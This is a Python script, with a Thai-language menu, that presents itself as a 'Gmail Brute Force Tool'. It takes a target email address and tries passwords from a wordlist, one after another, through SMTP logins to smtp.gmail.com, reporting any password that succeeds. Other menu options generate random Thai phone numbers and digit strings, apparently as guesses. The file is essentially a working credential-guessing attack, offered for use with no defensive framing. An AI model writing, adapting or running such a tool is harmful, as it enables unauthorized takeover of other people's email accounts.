import smtplib, sys, os, random
from os import system

OKGREEN = '\033[92m'
WARNING = '\033[0;33m'
FAIL = '\033[91m'
ENDC = '\033[0m'
LITBU = '\033[94m'
YELLOW = '\033[3;33m'
CYAN = '\033[0;36'
colors = ['\033[92m', '\033[91m', '\033[0;33m']
RAND = random.choice(colors)

GMAIL_PORT = '587'

# ฟังก์ชันการแสดงภาพ (artwork)
def artwork():
    print("\n")
    print(RAND + '''
     ▄████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓     ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀
    ██▒ ▀█▒▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒
   ▒██░▄▄▄░▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░
   ░▓█  ██▓▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░    ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄
   ░▒▓███▀▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
     ░▒   ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
      ░   ░ ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░ ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
    ░ ░   ░ ░      ░     ░   ▒    ▒ ░  ░ ░    ░  ░░ ░  ░   ▒   ░        ░ ░░ ░
          ░        ░         ░  ░ ░      ░  ░ ░  ░  ░      ░  ░░ ░      ░  ░
                                                               ░''')

# ฟังก์ชันการเข้าสู่เมนูหลัก
def main_menu():
    print(RAND + "\n[+] Welcome to the Gmail Brute Force Tool")
    print("[1] ใช้รหัสผ่านจากไฟล์ในตัว")
    print("[2] เพิ่มไฟล์รหัสผ่านเอง")
    print("[3] สุ่มหมายเลขโทรศัพท์ 10 หลัก")
    print("[4] สุ่มเลขตั้งแต่ 1 หลักจนถึง 9 หลัก")
    print("[5] ออกจากโปรแกรม")
    choice = input("กรุณาเลือกตัวเลือก (1/2/3/4/5): ")

    if choice == '1':
        use_inbuilt_passwords()
    elif choice == '2':
        use_custom_passwords()
    elif choice == '3':
        generate_random_phone_number()
    elif choice == '4':
        generate_random_numbers()
    elif choice == '5':
        print("กำลังออกจากโปรแกรม...")
        sys.exit(0)
    else:
        print("ข้อมูลไม่ถูกต้อง! กรุณาเลือกตัวเลือกที่ถูกต้อง")
        main_menu()

# ฟังก์ชันการใช้รหัสผ่านจากไฟล์ในตัว
def use_inbuilt_passwords():
    passswfile = "passworld.txt"
    if not os.path.exists(passswfile):
        print("[!] ไฟล์รหัสผ่านไม่พบ, กำลังสร้างไฟล์ passworld.txt...")
        with open(passswfile, "w") as file:
            file.write("password1\npassword2\npassword3\n")  # ใส่รหัสผ่านตัวอย่าง
        print("[+] สร้างไฟล์ passworld.txt เรียบร้อยแล้ว")
    
    try:
        passswfile = open(passswfile, "r")
    except Exception as e:
        print(e)
        sys.exit(1)

    user = input("กรุณากรอกที่อยู่อีเมลเป้าหมาย: ")

    # ลองรหัสผ่านในไฟล์
    for password in passswfile:
        try:
            smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(user, password)
            print("[+] รหัสผ่านที่พบ: %s" % password)
            break
        except smtplib.SMTPAuthenticationError:
            print("[-] รหัสผ่านไม่ถูกต้อง: %s " % password)
    
    passswfile.close()
    main_menu()

# ฟังก์ชันการเพิ่มไฟล์รหัสผ่านเอง
def use_custom_passwords():
    print("\n")
    passswfile = input("กรุณากรอกชื่อเส้นทางไฟล์ (สำหรับรายการรหัสผ่าน):")
    if not os.path.exists(passswfile):
        print(f"[!] ไฟล์ {passswfile} ไม่พบ, กรุณาตรวจสอบชื่อไฟล์")
        return
    
    try:
        passswfile = open(passswfile, "r")
    except Exception as e:
        print(e)
        sys.exit(1)

    user = input("กรุณากรอกที่อยู่อีเมลเป้าหมาย: ")

    # ลองรหัสผ่านในไฟล์
    for password in passswfile:
        try:
            smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(user, password)
            print("[+] รหัสผ่านที่พบ: %s" % password)
            break
        except smtplib.SMTPAuthenticationError:
            print("[-] รหัสผ่านไม่ถูกต้อง: %s " % password)
    
    passswfile.close()
    main_menu()

# ฟังก์ชันการสุ่มหมายเลขโทรศัพท์ 10 หลัก
def generate_random_phone_number():
    prefixes = ['081', '086', '062', '084']
    phone_number = random.choice(prefixes) + ''.join(random.choices('0123456789', k=7))
    print(f"[+] หมายเลขโทรศัพท์ที่สุ่มได้: {phone_number}")
    main_menu()

# ฟังก์ชันการสุ่มเลขตั้งแต่ 1 หลักจนถึง 9 หลัก
def generate_random_numbers():
    for length in range(1, 10):  # สุ่มจาก 1 หลัก ถึง 9 หลัก
        random_number = ''.join(random.choices('0123456789', k=length))
        print(f"[+] หมายเลขที่สุ่มได้ ({length} หลัก): {random_number}")
    main_menu()

# เรียกฟังก์ชันเมนูหลัก
main_menu()